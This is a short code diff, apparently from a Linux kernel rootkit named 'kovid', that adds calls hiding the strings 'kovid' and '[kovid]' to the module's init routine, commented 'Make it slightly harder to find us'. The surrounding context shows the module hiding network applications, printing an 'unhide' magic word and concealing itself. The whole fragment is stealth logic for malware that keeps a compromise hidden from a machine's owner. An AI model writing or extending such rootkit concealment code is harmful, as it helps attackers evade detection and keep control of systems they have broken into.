@@ -815,6 +815,12 @@ static int __init kv_init(void) {
      */
     kv_scan_and_hide_netapp();
 
+    /**
+     * Make it slightly harder to find us
+     */
+    load_hidden_string("kovid");
+    load_hidden_string("[kovid]");
+
 #ifndef DEBUG_RING_BUFFER
     prinfo("Your module \'unhide\' magic word is: '%s'\n", magic_word);
     kv_hide_mod();
